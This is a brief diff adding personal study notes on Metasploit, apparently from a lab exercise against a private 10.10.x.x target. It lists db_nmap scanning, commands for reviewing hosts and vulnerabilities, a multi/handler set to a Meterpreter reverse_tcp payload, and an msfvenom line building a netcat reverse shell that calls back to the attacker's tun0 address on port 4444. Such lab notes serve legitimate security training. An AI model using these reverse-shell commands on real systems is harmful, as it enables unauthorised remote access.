@@ -1,0 +1,9 @@
+METASPLOIT
+db_nmap -sV 10.10.133.117 (nmap recording in our db for exploitation)
+then run "hosts" and "services" to display information about scanned ones
+type vulns
+to show discovered vulnerabilities
+search multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
